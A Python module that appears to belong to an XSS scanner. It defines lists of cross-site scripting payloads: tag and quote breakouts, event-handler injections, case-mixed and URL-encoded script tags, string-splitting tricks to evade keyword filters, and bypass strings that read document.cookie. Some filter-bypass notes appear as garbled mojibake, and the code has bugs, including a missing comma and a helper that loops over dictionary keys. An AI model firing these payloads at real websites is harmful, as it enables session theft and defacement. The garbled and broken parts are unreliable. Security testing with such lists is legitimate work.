import re
keyword = {
    'close': [],
    'close_tag': [],
    'action': [],
    'onevent': [],
    'tag': [],
    'others': [],
    'illusion': []}


def keyword_init():
    global keyword
    keyword.clear()
    keyword['close'] = [
        "\"591",
        "\'591",
        "%22591",
        "%27591",  # 以上，测试>"'是否过滤
        ">591",
        "<591",
        "%3e591",
        "%3c591",
        "/591",
        "%2f591"
        # "</IfrAme>591",
        # "</A>591",
        # "/>591"
    ]
    keyword['close_tag'] = [
        "\"591",
        "\'591",
        "/>591",
        "%2f>591",
        "</IfrAme>591",
        "</A>591",
        "<%2fIfrAme>591",
        "<%2fA>591"
    ]

    keyword['action'] = ["prompt(591)",
                         "prompt`591`",
                         "confirm(591)"
                         "confirm`591`",
                         "alert(591)",
                         "alert`591`",
                         "window[`ale`+`rt`]`591`",
                         "window[`ale`%2b`rt`]`591`",
                         "window[`ale`%252b`rt`]`591`",
                         "window['ale'+'rt'](591)",
                         "window['ale'%2b'rt'](591)",
                         "window['ale'%252b'rt'](591)"
                         ]

    keyword['onevent'] = ["oNwHeEl=591",
                          "oNcLIck=591",
                          "OnmOuseOver=591",
                          "OnmoUseoUt=591",
                          "ONfoCus=591",
                          "oNloAd=591",  # <body onload=alert(1)>
                          "HReF=jAvAScRipt:591"]  # <A HReF=jAvAScRipt:591>aaaa</a>
    keyword['tag'] = ["<IfrAme>591</IfrAme>",
                      "<A>591</A>",
                      "<ScRipt>591</ScRipt>",
                      "<iNpUt>591",
                      "<BoDy>591",
                      "<ImG>591"
                      ]

    keyword['others'] = [
        "<ScRipt>591<ScrIpt>",
        "%3cScRipt%3e591%3cScrIpt%3e",
        "<a%20onwheel=prompt`591`>591</a>",
        "<a%20onwheel=prompt(591)>591</a>",
        "<a/onwheel=prompt(591)>591</a>",
        "<a/onwheel=window[`con`+`firm`]`591`>591</a>",
        "<a/onwheel=window[`con`%2b`firm`]`591`>591</a>",
        "<a/onwheel=window[`con`%252b`firm`]`591`>591</a>",
        "<a/onwheel=window['al'%2b'ert']()>591",
        "\"'\"%20accesskey=\"m\"onclick=\"prompt(591)%20",
        "%20auTofoCus%20onFoCus=prompt`591`",
        "<BoDy oNloAd=prompt(591)>"
    ]
    keyword['illusion'] = [
        "<A/OnwHeEl=prompt(591)>591</A>",
        "<BoDy oNloAd=prompt(591)>",
        "< script > alert(\"XSS\")</script>",
        "<script>alert(123)</script>",
        "´úÂë¹ýÂË£º",
        "medium--> Ë«Ð´ÈÆ¹ý£º<sc<script>ript>alert(/xss/)</script>",
        "	    ´óÐ¡Ð´»ìÏýÈÆ¹ý£º<ScRipt>alert(/xss/)</script>",
        "high-->Í¨¹ýimg¡¢bodyµÈ±êÇ©µÄÊÂ¼þ»òÕßiframeµÈ±êÇ©µÄsrc×¢Èë¶ñÒâµÄjs´úÂë:",
        "	<img src=1 onerror=alert(/xss/)>",
        "<scRscrIPT>prompt(¡®qq¡¯)<Scrscriptipt>",
        "onmouseover=¡¯alert(xss)¡¯",
        "onmouseover=¡¯prompt(qq)¡¯",
        "<script>alert(\'hello£¬gaga!\');</script>",
        ">\"\'><img src=\"javascript.:alert(\'XSS\')\">",
        ">\"\'><script>alert(\'XSS\')</script>",
        "<table background=\'javascript.:alert(([code])\'></table>",
        "<object type=text/html data=\'javascript.:alert(([code]);\'></object>",
        "\"+alert(\'XSS\')+\"",
        "\'><script>alert(document.cookie)</script>",
        "=\'><script>alert(document.cookie)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(vulnerable)</script>",
        "<s&#99;ript>alert(\'XSS\')</script>",
        "<img src=\"javas&#99;ript:alert(\'XSS\')\">",
        "%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e",
        "%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e",
        "%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html",
        "<script>alert(\'Vulnerable\')</script>",
        "a.jsp/<script>alert(\'Vulnerable\')</script>",
        "\"><script>alert(\'Vulnerable\')</script>",
        "<IMG SRC=\"javascript.:alert(\'XSS\');\">"

    ]
    # [print(e) for e in keyword]


def keyword_(key):
    global keyword
    while key == "<>":
        keyword_2 = []
        for w1 in keyword:
            if re.search("<|>", w1):
                w2 = ""
                if re.search("<", w1):
                    w2 = re.sub("<", "%3c", w1)
                    if re.search(">", w2):
                        w2 = re.sub(">", "%3e", w2)
                    keyword_2.append(w2)
                else:
                    if re.search(">", w1):
                        w2 = re.sub(">", "%3e", w1)
                    keyword_2.append(w2)
        keyword += keyword_2
        break
    while key == "\"'>":
        newlist = ["\"'>" + i for i in keyword]
        keyword = newlist
        # [print(e) for e in keyword]
        break

    # def keyword_add_clog(self):
# if __name__ == '__main__':
   # keyword_expand("\"'>")
